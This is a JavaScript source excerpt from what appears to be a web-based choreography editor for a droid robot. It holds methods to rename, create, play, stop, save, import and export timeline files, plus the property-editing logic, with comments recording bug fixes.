      if (!adminGuard.unlocked && !_choreoUnlocked) {
        adminGuard.showModal(null, () => choreoEditor.renameChor());
        return;
      }
      if (!_chor) { toast('No choreography loaded', 'error'); return; }
      const oldName = _chor.meta.name;
      const newName = (prompt('New filename (without .chor):', oldName) || '').trim();
      if (!newName || newName === oldName) return;
      // apiDetail so we can surface 409 "already exists" + 401 "admin
      // expired" + 503 separately. Was using api() which collapsed
      // everything to null → generic "Rename failed".
      const r = await apiDetail('/choreo/rename', 'POST', { old_name: oldName, new_name: newName });
      if (!r.ok) {
        const hint = r.status === 401 ? ' — admin lock expired' :
                     r.status === 409 ? ' — name already exists' : '';
        toast(`Rename failed: ${r.error}${hint}`, 'error');
        return;
      }
      _chor.meta.name = newName;
      // Refresh select dropdown: update existing option value + text
      const sel = document.getElementById('chor-select');
      if (sel) {
        const opt = [...sel.options].find(o => o.value === oldName);
        if (opt) {
          const lbl = _chor.meta.label || newName;
          const emj = _chor.meta.emoji ? _chor.meta.emoji + ' ' : '';
          const diff = lbl.toLowerCase().replace(/\s+/g,'_') !== newName.toLowerCase();
          opt.value = newName;
          opt.textContent = `${emj}${lbl}${diff ? ' (' + newName + ')' : ''}`;
        }
        sel.value = newName;
      }
      toast(`Renamed: ${oldName} → ${newName}`, 'ok');
    },

    newChor() {
      const name = prompt('Choreography name:', 'my_show');
      if (!name) return;
      _chor = {
        meta:   { name, version:'1.0', duration:0, created:new Date().toISOString().slice(0,10), author:'AstromechOS' },
        // Track schema MUST match what _renderAllTracks / _validateServoRefs /
        // the drop handler all expect. The legacy `servos:[]` field was
        // replaced by the dome/body/arm trio in the 2026-05-09 migration;
        // creating a new choreo with the old shape made every subsequent
        // load() re-run the migration AND mangled brand-new files since
        // load() deletes `tracks.servos` after migrating it.
        tracks: {
          audio: [],         lights: [],        dome: [],
          dome_servos: [],   body_servos: [],   arm_servos: [],
          propulsion: [],    markers: [],
        },
      };
      _setDirty(true); _existsOnDisk = false; _renderAllTracks();
      const sel = document.getElementById('chor-select');
      if (sel) { const opt = document.createElement('option'); opt.value = name; opt.textContent = name; opt.selected = true; sel.appendChild(opt); }
      toast(`New choreography: ${name}`, 'ok');
    },

    async play() {
      if (!_chor) { toast('No choreography loaded', 'error'); return; }
      // _busy guard: serializes play/save/stop so a double-click on PLAY
      // (or PLAY while a save is in flight) can't race the server. The
      // server-side _play_lock catches concurrent /choreo/play requests
      // too, but a 503 from there is ugly UX — better to short-circuit
      // here and tell the user "still working".
      if (_busy) { toast('Still working — wait a moment', 'warn'); return; }
      _busy = true;
      try {
        let playName = _chor.meta.name;
        const isAdmin = document.body.classList.contains('admin-unlocked');
        if (_existsOnDisk && !_dirty) {
          // No changes — play the saved file as-is
        } else if (_existsOnDisk && _dirty && isAdmin) {
          // Admin modified an existing file — auto-sync to disk before playing
          await this._save({ requireAuth: false });
        } else {
          // Non-admin with unsaved edits, OR new choreo never saved — use invisible temp file
          const preview = { ..._chor, meta: { ..._chor.meta, name: '__preview__' } };
          await api('/choreo/save', 'POST', { chor: preview });
          playName = '__preview__';
        }
        // Bug C1 fix 2026-05-15: optimistic lock via canonical
        // _setChoreoLockUI (sets JS vars + CSS + force-release).
        const usesProp = !!(_chor.tracks?.propulsion?.length);
        const usesDome = !!(_chor.tracks?.dome?.length);
        if (usesProp || usesDome) {
          _setChoreoLockUI(usesProp, usesDome, _chor.meta.name);
        }
        const result = await api('/choreo/play', 'POST', { name: playName });
        if (!result) {
          // Bug H2 fix: rollback via _setChoreoLockUI(false,false,'').
          if (usesProp || usesDome) _setChoreoLockUI(false, false, '');
        } else {
          if (playName === '__preview__' && isAdmin) {
            toast(`Preview playing — press Save to keep this choreography`, 'warn');
          } else {
            toast(`Playing: ${_chor.meta.name}`, 'ok');
          }
          const pb = el('chor-btn-play');
          if (pb) { pb.classList.add('chor-playing'); pb.textContent = '▶ PLAYING…'; }
          _startPolling();
        }
      } finally {
        _busy = false;
      }
    },

    async stop() {
      if (_busy) { toast('Still working — wait a moment', 'warn'); return; }
      _busy = true;
      try {
        await api('/choreo/stop', 'POST');
        _stopPolling(); _updateAlarms(null);
        const ph = document.getElementById('chor-playhead'); if (ph) ph.style.left = '0px';
        const tc = document.getElementById('chor-timecode'); if (tc) tc.textContent = '00:00.000';
        _updateTelem(null);
        _chorMon.setMode('random');
        toast('Choreo stopped', 'ok');
      } finally {
        _busy = false;
      }
    },

    // Public save(): guards with _busy. Internal _save() bypasses the guard
    // because it's called from play() which already holds _busy=true; calling
    // the public save() from there would dead-lock the toast at "still
    // working" and skip the save.
    async save(opts = {}) {
      if (_busy) { toast('Still working — wait a moment', 'warn'); return; }
      _busy = true;
      // WOW polish E2 2026-05-15: withSaveFeedback on the SAVE button so
      // operator gets the universal Saving…→Saved ✓ pulse pattern.
      const btn = document.querySelector('#tab-choreo button[onclick*="choreoEditor.save"]');
      try {
        if (btn) {
          await withSaveFeedback(btn, async () => {
            const r = await this._save(opts);
            // _save returns nothing on success but also nothing on cancel
            // (admin guard) — treat absence of toast error as success.
            return r;
          });
        } else {
          await this._save(opts);
        }
      } catch { /* withSaveFeedback already showed Failed */ }
      finally {
        _busy = false;
      }
    },

    async _save({ requireAuth = true } = {}) {
      if (requireAuth && !adminGuard.unlocked && !_choreoUnlocked) {
        adminGuard.showModal(null, () => choreoEditor.save());
        return;
      }
      if (!_chor) return;
      _validateAudioOverflow();
      _refreshServoLabels();
      // Write VESC config snapshot into meta for portability validation
      if (_vescCfgSnapshot) {
        _chor.meta.config_snapshot = {
          vesc_invert_L:    _vescCfgSnapshot.invert_L    ?? false,
          vesc_invert_R:    _vescCfgSnapshot.invert_R    ?? false,
          vesc_power_scale: _vescCfgSnapshot.power_scale ?? 1.0,
        };
      }
      // apiDetail so we can surface the schema-validation error from the
      // server (CR-2 audit added the validator) — was generic "Save failed"
      // before. 401 also distinguishable from a real schema reject.
      const r = await apiDetail('/choreo/save', 'POST', { chor: _chor });
      if (!r.ok) {
        const hint = r.status === 401 ? ' — admin lock expired' :
                     r.status === 400 ? '' :   // schema error already in r.error
                     r.status === 503 ? ' — server busy' : '';
        toast(`Save failed: ${r.error}${hint}`, 'error');
        return;
      }
      _setDirty(false); _existsOnDisk = true;
      _validateServoRefs(); _validateAudioRefs();
      toast(`Saved: ${_chor.meta.name}`, 'ok');
    },

    async exportChor() {
      if (!adminGuard.unlocked && !_choreoUnlocked) {
        adminGuard.showModal(null, () => choreoEditor.exportChor());
        return;
      }
      if (!_chor) { toast('No choreography loaded', 'error'); return; }
      if (_dirty) await this.save();
      const json = JSON.stringify(_chor, null, 2);
      const blob = new Blob([json], { type: 'application/json' });
      const url  = URL.createObjectURL(blob);
      const a    = document.createElement('a');
      a.href = url; a.download = (_chor.meta.name || 'choreography') + '.chor'; a.click();
      URL.revokeObjectURL(url);
      toast('Choreo exported', 'ok');
    },

    async importChor() {
      if (!adminGuard.unlocked && !_choreoUnlocked) {
        adminGuard.showModal(null, () => choreoEditor.importChor());
        return;
      }
      const input = document.createElement('input');
      input.type = 'file'; input.accept = '.chor,application/json';
      input.onchange = async () => {
        const file = input.files[0]; if (!file) return;
        let chor;
        try { chor = JSON.parse(await file.text()); } catch { toast('Invalid .chor file', 'error'); return; }
        if (!chor?.meta?.name) { toast('Invalid .chor: missing meta.name', 'error'); return; }
        // Audit finding Perf L-8 2026-05-15: confirm overwrite if the
        // target name already exists on disk. Was silently stomping
        // the existing file with no warning.
        const existing = await api('/choreo/list');
        if (Array.isArray(existing) && existing.some(e => (e.name || e) === chor.meta.name)) {
          if (!confirm(`"${chor.meta.name}" already exists. Overwrite it?`)) {
            toast('Import cancelled', 'info');
            return;
          }
        }
        const r = await apiDetail('/choreo/save', 'POST', { chor });
        if (!r.ok) { toast(`Import failed: ${r.error}`, 'error'); return; }
        // Refresh dropdown and load the imported choreo
        const names = await api('/choreo/list');
        const sel   = document.getElementById('chor-select');
        if (sel && names) {
          sel.innerHTML = '<option value="">— select choreography —</option>' +
            _chorSelectOptions(names);
          sel.onchange = () => this._switchTo(sel.value);
          sel.value = chor.meta.name;
        }
        await this.load(chor.meta.name);
        toast(`Imported: ${chor.meta.name}`, 'ok');
      };
      input.click();
    },

    dismissAbort() {
      const modal = document.getElementById('modal-chor-abort');
      if (modal) modal.style.display = 'none';
      _updateAlarms(null);
    },

    setSnap(val) { _snapVal = val; _syncSnapUI(); },

    zoom(delta) {
      const factor = delta > 0 ? 1.25 : 0.8;
      _zoomFactor = Math.max(0.1, Math.min(10, _zoomFactor * factor));
      if (_chor) _renderAllTracks();
    },

    setEasing(name) {
      if (!_selected || _selected.track !== 'dome') return;
      const item = (_chor.tracks.dome || [])[_selected.idx];
      if (!item) return;
      item.easing = name; _setDirty(true); _drawEasingPreview(name);
    },

    _setProp(track, idx, field, rawVal) {
      const item = (_chor.tracks[track] || [])[idx];
      if (!item) return;
      // Branch by field semantics: most inspector inputs are numeric, but a
      // handful are deliberately strings (audio file path, lights text, mode
      // selectors, servo IDs, easing names…). The previous blanket
      // `parseFloat(rawVal); isNaN(num) ? rawVal : num` silently coerced
      // anything that happened to look like a number — typing "1234" in the
      // LCD text box became the literal Number 1234, which then broke
      // `String(item.text).slice(0,20)` downstream and confused the chor
      // monitor's text rendering.
      // `target` is dual-typed: lights uses it as a string ('fhp', 'rhp'…),
      // dome/body/arm_servos with action='degree' uses it as a number.
      const isStringField =
        field === 'text'     || field === 'file'      || field === 'mode'    ||
        field === 'display'  || field === 'sequence'  || field === 'effect'  ||
        field === 'priority' || field === 'easing'    || field === 'servo'   ||
        field === 'action'   || field === 'group'     ||
        (field === 'target' && track === 'lights');
      if (isStringField) {
        item[field] = String(rawVal);
      } else {
        const num = parseFloat(rawVal);
        item[field] = isNaN(num) ? rawVal : num;
      }
      _setDirty(true);
      // Dome overlap guard — clamp t and duration to prevent overlapping commands
      if (track === 'dome') {
        if (field === 'duration') item.duration = _domeClampDur(idx, item.duration);
        if (field === 't')        item.t        = _domeClampT(idx, item.t);
      }
      const block = document.querySelector(`.chor-block[data-track="${track}"][data-idx="${idx}"]`);
      if (block) {
        if (field === 't')        block.style.left  = _px(item.t)        + 'px';
        if (field === 'duration') block.style.width = _px(item.duration) + 'px';
        // Arm block width depends on the three component fields — recompute
        // when any of them changes so the visual span on the timeline always
        // matches the actual wall-clock motion.
        if (track === 'arm_servos' && (field === 'panel_duration' || field === 'delay' || field === 'arm_duration')) {
          block.style.width = _px(_armBlockTotalDur(item)) + 'px';
        }
        const labelEl = block.querySelector('span');
        if (labelEl) labelEl.textContent = _blockLabel(track, item);
      }
      if (track === 'dome' && _chor) _renderDomeLane(_chor.tracks.dome);
      const _isServo = ['dome_servos', 'body_servos', 'arm_servos'].includes(track);
      if (_isServo && field === 'action') {
        if (rawVal === 'degree' && !item.easing) item.easing = 'ease-in-out';
        if (_selected && _selected.track === track && _selected.idx === idx)
          _updatePropsPanel(track, idx);
      } else if (track === 'lights' && field === 'mode') {
        if (_selected && _selected.track === track && _selected.idx === idx)
          _updatePropsPanel(track, idx);
      } else if (_selected && _selected.track === track && _selected.idx === idx) {
        _setInspectorTitle(track, item);
      }
    },

    _deleteSelected() {
      if (_selected) _deleteBlock(_selected.track, _selected.idx);
    },

    // Switch audio block between specific file and random category
    _setAudioType(track, idx, type) {
      const item = (_chor.tracks[track] || [])[idx];
      if (!item) return;
      if (type === 'random' && !(item.file || '').toUpperCase().startsWith('RANDOM:')) {
        const firstCat = Object.keys(_audioIndex)[0] || 'happy';
        item.file = `RANDOM:${firstCat}`;
      } else if (type === 'specific' && (item.file || '').toUpperCase().startsWith('RANDOM:')) {
        item.file = _audioScanned[0] || '';
      }
      _setDirty(true);
      _validateAudioRefs();
      _renderTrack(track);
      _updatePropsPanel(track, idx);
      _setInspectorTitle(track, item);
    },

    // Called from inline onchange on select elements
    _onFieldChange(track, idx, field, value) {
      _onFieldChange(track, idx, field, value);
    },

    // Returns true while a choreography is actively playing
    isPlaying: () => _pollTimer !== null,

    // Stop the status poll — called by onTabSwitch when leaving the choreo tab
    _stopPolling,
  };
})();
